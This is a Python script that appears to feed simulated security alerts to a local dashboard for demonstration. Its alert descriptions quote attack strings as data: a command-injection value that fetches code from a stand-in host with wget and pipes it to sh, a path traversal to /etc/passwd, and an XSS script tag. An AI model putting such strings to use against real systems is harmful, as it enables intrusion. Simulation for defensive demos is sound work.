#!/usr/bin/env python3
"""
CyberGAN — Real-Time Threat Simulator
Pumps realistic attack events into the live dashboard via WebSocket.
Run this alongside `python main.py dashboard` to see the SOC in action.

Usage:
    python simulate_threats.py               # Default: moderate activity
    python simulate_threats.py --intensity high  # High attack frequency
    python simulate_threats.py --intensity low   # Low / calm mode
"""

import asyncio
import json
import random
import time
import argparse
import websockets
import psutil

# ── Attack Scenarios ──────────────────────────────────────────────────────────

ATTACK_SCENARIOS = [
    {
        "event_type": "sql_injection",
        "severity": "high",
        "title": "SQL Injection Attempt",
        "description": "UNION SELECT payload detected in HTTP query string",
        "source_ip": None,  # will be randomised
        "action_taken": "waf_rule block (executed)",
        "mitre_techniques": ["T1190"],
        "kill_chain_stage": "exploitation",
    },
    {
        "event_type": "brute_force",
        "severity": "medium",
        "title": "SSH Brute Force",
        "description": "140 failed login attempts from single IP in 60s",
        "source_ip": None,
        "action_taken": "block_ip (executed)",
        "mitre_techniques": ["T1110"],
        "kill_chain_stage": "delivery",
    },
    {
        "event_type": "port_scan",
        "severity": "low",
        "title": "Port Scan Detected",
        "description": "SYN sweep across 1024 ports in <2s",
        "source_ip": None,
        "action_taken": "rate_limit (executed)",
        "mitre_techniques": ["T1046"],
        "kill_chain_stage": "reconnaissance",
    },
    {
        "event_type": "xss_attack",
        "severity": "medium",
        "title": "Cross-Site Scripting (XSS)",
        "description": "<script>alert(1)</script> detected in POST body",
        "source_ip": None,
        "action_taken": "waf_rule block (executed)",
        "mitre_techniques": ["T1059.007"],
        "kill_chain_stage": "exploitation",
    },
    {
        "event_type": "ransomware_activity",
        "severity": "critical",
        "title": "🚨 Ransomware Pattern Detected",
        "description": "Mass file encryption: 500+ files renamed .locked in /home",
        "source_ip": None,
        "action_taken": "kill_process (executed)",
        "mitre_techniques": ["T1486"],
        "kill_chain_stage": "actions_on_objectives",
    },
    {
        "event_type": "command_injection",
        "severity": "high",
        "title": "Command Injection",
        "description": "; wget http://evil.sh | sh detected in web request",
        "source_ip": None,
        "action_taken": "block_ip (executed)",
        "mitre_techniques": ["T1059"],
        "kill_chain_stage": "exploitation",
    },
    {
        "event_type": "ddos_flood",
        "severity": "high",
        "title": "DDoS SYN Flood",
        "description": "12,000 SYN packets/sec from distributed sources",
        "source_ip": None,
        "action_taken": "firewall_block (executed)",
        "mitre_techniques": ["T1498"],
        "kill_chain_stage": "delivery",
    },
    {
        "event_type": "privilege_escalation",
        "severity": "critical",
        "title": "🚨 Privilege Escalation",
        "description": "sudo exploit: CVE-2023-22809 — sudoedit bypass",
        "source_ip": None,
        "action_taken": "kill_process (advisory only)",
        "mitre_techniques": ["T1548.003"],
        "kill_chain_stage": "installation",
    },
    {
        "event_type": "c2_beacon",
        "severity": "critical",
        "title": "🚨 C2 Beacon Detected",
        "description": "Periodic HTTPS callback to known C2 IP every 30s",
        "source_ip": None,
        "action_taken": "firewall_block (executed)",
        "mitre_techniques": ["T1071.001"],
        "kill_chain_stage": "command_and_control",
    },
    {
        "event_type": "credential_stuffing",
        "severity": "medium",
        "title": "Credential Stuffing",
        "description": "3,200 login attempts with known breached credentials",
        "source_ip": None,
        "action_taken": "block_ip (executed)",
        "mitre_techniques": ["T1078"],
        "kill_chain_stage": "delivery",
    },
    {
        "event_type": "lfi_attack",
        "severity": "high",
        "title": "Local File Inclusion (LFI)",
        "description": "Path traversal: ../../../../etc/passwd in URL",
        "source_ip": None,
        "action_taken": "waf_rule block (executed)",
        "mitre_techniques": ["T1083"],
        "kill_chain_stage": "reconnaissance",
    },
    {
        "event_type": "cryptojacking",
        "severity": "medium",
        "title": "Cryptojacking Process",
        "description": "xmrig miner detected — CPU 98%, outbound to pool.minexmr.com",
        "source_ip": None,
        "action_taken": "kill_process (executed)",
        "mitre_techniques": ["T1496"],
        "kill_chain_stage": "actions_on_objectives",
    },
    {
        "event_type": "web_shell",
        "severity": "critical",
        "title": "🚨 Web Shell Detected",
        "description": "PHP web shell at /var/www/html/images/shell.php",
        "source_ip": None,
        "action_taken": "isolate_service (advisory only)",
        "mitre_techniques": ["T1505.003"],
        "kill_chain_stage": "installation",
    },
    {
        "event_type": "log_tampering",
        "severity": "high",
        "title": "Log Tampering Detected",
        "description": "auth.log cleared; /var/log/syslog modified",
        "source_ip": None,
        "action_taken": "alert (executed)",
        "mitre_techniques": ["T1070.002"],
        "kill_chain_stage": "actions_on_objectives",
    },
]

FAKE_IPS = [
    "185.220.101.47", "45.142.212.100", "194.165.16.23",
    "91.108.4.1", "198.51.100.42", "203.0.113.77",
    "162.247.74.201", "178.73.215.171", "64.227.41.213",
    "5.188.206.14", "149.154.167.99", "109.201.133.195",
]

BLOCKED_IPS = []

# ── Stats tracking ────────────────────────────────────────────────────────────

stats = {
    "events_processed": 0,
    "threats_detected": 0,
    "actions_taken": 0,
    "ips_blocked": 0,
    "alerts_sent": 0,
}


def make_threat_event():
    scenario = random.choice(ATTACK_SCENARIOS)
    ip = random.choice(FAKE_IPS)

    event = {
        **scenario,
        "type": "threat",
        "source_ip": ip,
        "timestamp": time.time(),
    }

    # Update fake stats
    stats["events_processed"] += random.randint(1, 12)
    stats["threats_detected"] += 1
    if "executed" in scenario.get("action_taken", ""):
        stats["actions_taken"] += 1
        if "block_ip" in scenario.get("action_taken", "") or "firewall" in scenario.get("action_taken", ""):
            stats["ips_blocked"] += 1
            if ip not in BLOCKED_IPS:
                BLOCKED_IPS.append(ip)
            if len(BLOCKED_IPS) > 8:
                BLOCKED_IPS.pop(0)
    stats["alerts_sent"] += 1

    return event


def make_status_update():
    """Agent status update with live system metrics."""
    try:
        cpu = psutil.cpu_percent(interval=None)
        mem = psutil.virtual_memory().percent
        disk = psutil.disk_usage("/").percent
    except Exception:
        cpu, mem, disk = random.uniform(20, 80), random.uniform(40, 75), random.uniform(30, 60)

    return {
        "type": "status",
        "mode": "hybrid",
        "brain": "heuristic",
        "uptime_s": time.time() - START_TIME,
        "stats": {**stats},
        "blocked_ips": list(BLOCKED_IPS),
        "active_threats": _make_active_threats(),
        "system": {
            "cpu": cpu,
            "memory": mem,
            "disk": disk,
            "network_mbps": round(random.uniform(0.5, 45.0), 1),
        },
    }


def _make_active_threats():
    stages = [
        "reconnaissance", "delivery", "exploitation",
        "installation", "command_and_control", "actions_on_objectives",
    ]
    threats = []
    for _ in range(random.randint(0, 4)):
        n_stages = random.randint(1, 3)
        threats.append({
            "id": random.randint(1000, 9999),
            "stages_hit": random.sample(stages, n_stages),
        })
    return threats


# ── Simulator ─────────────────────────────────────────────────────────────────

START_TIME = time.time()


async def simulate(ws, intensity: str):
    """Main simulation loop — sends events at varying rates."""

    intervals = {
        "low":    (4.0, 9.0),   # calm day
        "medium": (1.5, 4.0),   # moderate attack
        "high":   (0.3, 1.2),   # under fire
    }
    lo, hi = intervals.get(intensity, intervals["medium"])

    tick = 0
    print(f"  🎯  Simulator connected — intensity: {intensity.upper()}")
    print(f"  📊  Dashboard → http://127.0.0.1:8443\n")

    while True:
        # Send a threat event
        event = make_threat_event()
        await ws.send(json.dumps(event))
        print(f"  [{time.strftime('%H:%M:%S')}] 🔴 {event['title']}  ({event['source_ip']})")

        # Every 3rd event also push a full status update
        if tick % 3 == 0:
            status = make_status_update()
            await ws.send(json.dumps(status))

        tick += 1
        await asyncio.sleep(random.uniform(lo, hi))


async def main(intensity: str):
    url = "ws://127.0.0.1:8443/ws"
    print(f"\n  CyberGAN Threat Simulator")
    print(f"  {'─' * 40}")
    print(f"  Connecting to {url} ...")

    retry = 0
    while True:
        try:
            async with websockets.connect(url) as ws:
                retry = 0
                await simulate(ws, intensity)
        except (ConnectionRefusedError, OSError):
            retry += 1
            wait = min(retry * 2, 10)
            print(f"  ⚠  Dashboard not reachable — retrying in {wait}s "
                  f"(make sure `python main.py dashboard` is running)")
            await asyncio.sleep(wait)
        except websockets.exceptions.ConnectionClosed:
            print("  WS closed — reconnecting...")
            await asyncio.sleep(2)
        except KeyboardInterrupt:
            print("\n  Simulator stopped.")
            break


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CyberGAN Threat Simulator")
    parser.add_argument(
        "--intensity",
        choices=["low", "medium", "high"],
        default="medium",
        help="Attack intensity (default: medium)",
    )
    args = parser.parse_args()

    try:
        asyncio.run(main(args.intensity))
    except KeyboardInterrupt:
        print("\n  Bye.")
